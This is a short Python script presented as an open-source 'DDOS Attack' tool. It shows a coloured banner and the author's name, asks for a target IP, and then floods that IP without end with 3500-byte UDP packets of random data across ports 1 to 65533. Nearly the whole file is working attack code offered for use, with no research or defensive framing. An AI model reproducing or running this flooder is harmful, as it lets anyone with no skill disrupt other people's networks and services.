# QICF DDOS TOLL
import socket
import os
import random
import time

B = '\033[1m'
R = '\033[31m'
N = '\033[0m'
y="\033[1;33m"
g="\033[1;32m"
white = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(3500)

os.system("clear")


print("""   \033[1;36m
   __  ___       ____              _     __
                     /  |/  /____  / __ \____ __   __(_)___/ /
                    / /|_/ / ___/ / / / / __ `/ | / / / __  / 
                   / /  / / /  _ / /_/ / /_/ /| |/ / / /_/ /  
                  /_/  /_/_/  (_)_____/\__,_/ |___/_/\__,_/   
                                                              

                                      
                                      
\033[1;42m\033[1;37m            WELCOME TO DDOS ATTACK          
\033[;0m\033[1;91m\033[1;92m

\033[1;31m••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;33m••••••••••••••••••••••••••••••••••••••••••••••••••

\033[1;32m [🔶] TOOL      \033[1;33m      : \033[1; DDOS Attack
\033[1;32m [🔶] STATUS          \033[1;33m: \033[1; open source 
\033[1;32m [🔶] TOOL OWNER      \033[1;33m: \033[1; Mr.David
\033[1;32m [🔶] FACEBOOK ID     \033[1;33m: \033[1; Mr.David
\033[1;32m [🔶] VERSION         \033[1;33m: \033[1; 1.1.0

\033[1;33m••••••••••••••••••••••••••••••••••••••••••••••••••
\033[1;31m••••••••••••••••••••••••••••••••••••••••••••••••••

""")

ip = input(g+" [❗] Targeted IP :\033[31m ")
os.system("clear")
print(y+" Starting Attack With QICF DDOS Tool .......")
time.sleep(3)
while True:
    sent = 0
    for port in range(1, 65534):
        white.sendto(bytes, (ip, port))
        sent = sent + 1
        print("\033[1;91mSend \033[1;32m%s \033[1;36m Packets to \033[1;33m%s \033[1;35mThrough port \033[1;32m%s " % (sent, ip, port))

print("\033[1;92m DDOS Attack finished✅ \033[0m")
